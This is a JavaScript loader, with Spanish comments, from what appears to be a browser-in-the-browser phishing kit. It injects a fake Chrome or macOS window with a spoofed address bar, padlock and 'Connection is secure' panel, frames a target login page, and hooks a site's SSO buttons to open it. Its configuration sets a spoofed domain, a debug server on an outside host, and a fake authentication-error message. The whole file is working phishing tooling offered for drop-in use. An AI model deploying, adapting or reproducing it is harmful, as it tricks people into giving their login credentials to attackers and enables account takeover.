/**
 * fescarcuddle-loader.js
 *
 * Drop-in loader. Usage on any page:
 *
 *   <script>
 *     window.appConfig = {
 *       iframeSrc:        "https://target.com/login",
 *       addressText:      "target.com/login",
 *       tabTitle:         "Login - Target",
 *       sitePanelMessage: "target.com",
 *       debugServerUrl:   "https://debug.x1-x.com",
 *       matchUrl:         "/dashboard",
 *       matchIframeSrc:   "/autenticado.html",
 *       matchAddressText: "https://target.com/dashboard",
 *       matchTabTitle:    "Dashboard - Target",
 *       matchFavicon:     "/favicon.svg",
 *       matchHideDelay:   3,
 *       matchCloseMessage:"Error durante el proceso de autenticacion."
 *     };
 *   </script>
 *   <script src="https://your-server.com/fescarcuddle-loader.js"></script>
 *   <script>FescarCuddle.attach('.btn-sso');</script>
 */
(function () {
  'use strict';

  /* ─── 1. Base URL del loader (para resolver rutas de variante) ───────── */
  var _scriptSrc = (document.currentScript && document.currentScript.src) || '';
  var _baseUrl   = _scriptSrc ? _scriptSrc.replace(/\/[^/]*$/, '') : '';

  function _abs(path) {
    return (_baseUrl ? _baseUrl : '') + '/' + path;
  }

  /* ─── 2. Detectar variante ───────────────────────────────────────────── */
  var _ua      = navigator.userAgent || '';
  var _isMac   = /Mac|iPhone|iPad|iPod/.test(_ua) && !/Windows/.test(_ua);
  var _isDark  = !!(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches);
  var _variant = (_isMac ? 'MacOS-Chrome' : 'Windows-Chrome') + '-' + (_isDark ? 'DarkMode' : 'LightMode');

  /* Exponer para que script.js lo use si lo necesita */
  window._isMac = _isMac;
  window._variantPath = '/' + _variant;

  /* ─── 3. Inyectar CSS de la variante ─────────────────────────────────── */
  var _link  = document.createElement('link');
  _link.rel  = 'stylesheet';
  _link.href = _abs(_variant + '/style.css');
  document.head.appendChild(_link);

  /* ─── 4. Inyectar HTML (Windows o MacOS) ─────────────────────────────── */
  var _html;

  if (_isMac) {
    _html = [
      '<div id="window" class="is-hidden" style="display:none">',
      '  <div id="title-bar-width">',
      '    <div id="title-bar" class="outer yosemite">',
      '      <span class="dots">',
      '        <div id="exit" class="dot red"></div>',
      '        <div id="minimize" class="dot amber"></div>',
      '        <div id="maximize" class="dot green"></div>',
      '      </span>',
      '      <span id="logo-description"></span>',
      '    </div>',
      '    <div id="url-bar">',
      '      <img src="' + _abs(_variant + '/ssl.svg') + '" width="20" height="20" id="ssl-padlock">',
      '      <span id="domain-name"></span>',
      '      <span id="domain-path"></span>',
      '    </div>',
      '  </div>',
      '  <iframe id="content" class="is-hidden" frameBorder="0"></iframe>',
      '</div>'
    ].join('\n');
  } else {
    var _favicon = _abs(_variant + '/google.svg');
    _html = [
      '<div id="window" class="is-hidden" style="display:none">',
      '  <div id="tab-bar">',
      '    <button id="tab-search-btn" type="button">',
      '      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">',
      '        <path d="M7 10l5 5 5-5" stroke="currentColor" stroke-width="2.9" stroke-linecap="round" stroke-linejoin="round"/>',
      '      </svg>',
      '    </button>',
      '    <div id="tabs-area">',
      '      <div id="active-tab">',
      '        <img src="' + _favicon + '" class="tab-favicon" id="fesc-favicon" width="16" height="16">',
      '        <span class="tab-title" id="tab-title"></span>',
      '        <span class="tab-close">&#10005;</span>',
      '      </div>',
      '    </div>',
      '    <div id="window-controls">',
      '      <span id="minimize">&#8212;</span>',
      '      <span id="square">&#9633;</span>',
      '      <span id="exit">&#10005;</span>',
      '    </div>',
      '  </div>',
      '  <div id="nav-bar">',
      '    <div id="nav-buttons">',
      '      <span class="nav-btn" id="btn-back"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></span>',
      '      <span class="nav-btn" id="btn-forward"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></span>',
      '      <span class="nav-btn" id="btn-reload"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></span>',
      '    </div>',
      '    <div id="address-bar">',
      '      <div id="address-settings-btn">',
      '        <svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">',
      '          <path d="M4.5 6.5H15.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>',
      '          <circle cx="8" cy="6.5" r="1.7" stroke="currentColor" stroke-width="1.6" fill="white"/>',
      '          <path d="M4.5 13.5H15.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>',
      '          <circle cx="12" cy="13.5" r="1.7" stroke="currentColor" stroke-width="1.6" fill="white"/>',
      '        </svg>',
      '      </div>',
      '      <div id="address-text"><span id="domain-name"></span></div>',
      '      <span class="nav-btn" id="btn-bookmark"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73-1.64 7.03L12 17.27l6.18 3.73-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/></svg></span>',
      '    </div>',
      '  </div>',
      '  <div id="site-info-panel" aria-hidden="true">',
      '    <div class="site-panel-header"><span class="site-panel-close" id="site-panel-close">&#10005;</span></div>',
      '    <div id="site-panel-message"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 10V8a5 5 0 1 1 10 0v2" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><rect x="5" y="10" width="14" height="11" rx="2" stroke="currentColor" stroke-width="2.2"/></svg></span><span>Connection is secure</span></div><span class="site-panel-chevron">&#8250;</span></div>',
      '    <div class="site-panel-divider"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 4a4 4 0 0 0-4 4v4.8L6 15v1h12v-1l-2-2.2V8a4 4 0 0 0-4-4z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/><path d="M10.5 18a1.5 1.5 0 0 0 3 0" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg></span><span>Notifications</span></div><div class="site-toggle"><span class="site-toggle-knob"></span></div></div>',
      '    <button class="site-panel-action" type="button">Reset permission</button>',
      '    <div class="site-panel-divider"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10.8 3h2.4l.5 2.1a7.2 7.2 0 0 1 1.8.8l1.9-1 1.7 1.7-1 1.9a7.2 7.2 0 0 1 .8 1.8L21 10.8v2.4l-2.1.5a7.2 7.2 0 0 1-.8 1.8l1 1.9-1.7 1.7-1.9-1a7.2 7.2 0 0 1-1.8-.8L13.2 21h-2.4l-.5-2.1a7.2 7.2 0 0 1-1.8-.8l-1.9 1-1.7-1.7 1-1.9a7.2 7.2 0 0 1-.8-1.8L3 13.2v-2.4l2.1-.5a7.2 7.2 0 0 1 .8-1.8l-1-1.9 1.7-1.7 1.9 1a7.2 7.2 0 0 1 1.8-.8L10.8 3z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/><circle cx="12" cy="12" r="2.6" stroke="currentColor" stroke-width="2.2"/></svg></span><span>Site settings</span></div><span class="site-panel-chevron">&#8599;</span></div>',
      '  </div>',
      '  <iframe id="content" class="is-hidden" frameBorder="0"></iframe>',
      '</div>'
    ].join('\n');
  }

  /* Tambien el div de mensaje de cierre que usa script.js */
  _html += [
    '<div id="match-close-message" style="',
    '  display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);',
    '  max-width:480px;width:calc(100% - 48px);background:#1c1f26;',
    '  border:1px solid #3a2222;border-left:4px solid #c0392b;border-radius:10px;',
    '  padding:24px 28px;box-shadow:0 8px 32px rgba(0,0,0,.55);color:#e8eaed;',
    '  font-family:\'Segoe UI\',system-ui,sans-serif;font-size:.9rem;',
    '  line-height:1.6;z-index:9999;white-space:pre-wrap;">',
    '</div>'
  ].join('');

  var _wrap = document.createElement('div');
  _wrap.innerHTML = _html;
  document.body.appendChild(_wrap);

  /* ─── 5. API publica — definida sincrona para que este disponible al instante ── */
  window.FescarCuddle = {
    show: function () {
      if (window.FescarCuddleCore) window.FescarCuddleCore.show();
    },
    hide: function () {
      if (window.FescarCuddleCore) window.FescarCuddleCore.hide();
    },
    attach: function (target) {
      var els;
      if (typeof target === 'string') {
        els = Array.prototype.slice.call(document.querySelectorAll(target));
      } else if (target && target.nodeType) {
        els = [target];
      } else if (target && typeof target.length === 'number') {
        els = Array.prototype.slice.call(target);
      } else {
        return;
      }
      els.forEach(function (el) {
        el.addEventListener('click', function (e) {
          e.preventDefault();
          window.FescarCuddle.show();
        });
      });
    }
  };

  /* ─── 6. Cargar jQuery (si no esta) y luego script.js ────────────────── */
  function _loadScript(src, cb) {
    var s = document.createElement('script');
    s.src = src;
    s.onload = cb || null;
    document.head.appendChild(s);
  }

  function _loadScriptJs() {
    _loadScript(_abs('script.js'));
  }

  if (window.jQuery) {
    _loadScriptJs();
  } else {
    _loadScript(
      'https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js',
      _loadScriptJs
    );
  }

})();